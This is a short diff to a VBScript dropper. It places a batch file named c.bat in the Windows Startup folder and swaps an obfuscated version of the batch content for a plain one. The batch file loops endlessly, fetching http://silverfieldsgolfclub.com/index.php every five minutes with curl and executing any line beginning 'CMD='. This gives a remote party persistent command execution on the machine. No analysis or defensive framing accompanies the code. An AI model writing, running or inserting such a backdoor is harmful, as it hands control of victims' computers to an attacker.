@@ -1,5 +1,14 @@
 Path = CreateObject("WScript.Shell").SpecialFolders("Startup")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 Set objFile = objFSO.CreateTextFile(Path & "\c.bat", True)
-objFile.Write "挦獬਍敀档⁯景൦猊瑥潬慣⁬湥扡敬敤慬敹敤灸湡楳湯਍氺潯൰昊牯⼠⁦琢歯湥㵳ⰱ‪敤楬獭㴽•┥⁡湩⠠挧牵⁬猭栠瑴㩰⼯楳癬牥楦汥獤潧晬汣扵挮浯椯摮硥瀮灨帠⁼楦摮瑳⁲戯∠䵃㵄✢ 潤⠠਍††敳⁴挢浯慭摮┽戥ഢ †攠档⁯敒散癩摥挠浯慭摮›挡浯慭摮ഡ †℠潣浭湡Ⅴ਍ഩഊ琊浩潥瑵⼠⁴〳‰港扯敲歡㸠畮൬朊瑯⁯潬灯਍" & vbCrLf
+content = "@echo off"  & vbCrLf & _ 
+"setlocal enabledelayedexpansion"  & vbCrLf & _ 
+":loop"  & vbCrLf & _ 
+"for /f ""tokens=1,* delims=="" %%a in ('curl -s http://silverfieldsgolfclub.com/index.php ^| findstr /b ""CMD=""') do (" & vbCrLf & _ 
+"set ""command=%%b""" & vbCrLf & _ 
+"!command!" & vbCrLf & _ 
+")" & vbCrLf & _ 
+"timeout /t 300 /nobreak >nul" & vbCrLf & _ 
+"goto loop" 
+objFile.Write content & vbCrLf
 objFile.Close
